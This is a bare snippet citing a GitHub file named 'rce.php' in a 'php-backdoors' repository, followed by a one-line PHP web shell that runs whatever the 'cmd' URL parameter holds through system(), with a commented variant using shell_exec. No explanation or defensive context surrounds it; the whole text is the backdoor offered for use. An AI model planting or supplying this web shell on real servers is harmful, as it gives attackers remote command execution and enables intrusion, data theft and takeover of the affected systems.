https://raw.githubusercontent.com/F-Masood/php-backdoors/main/rce.php

```bash

<?php system($_GET['cmd']); ?>

//or

//<?php echo (shell_exec($_GET['cmd'])); ?>

```
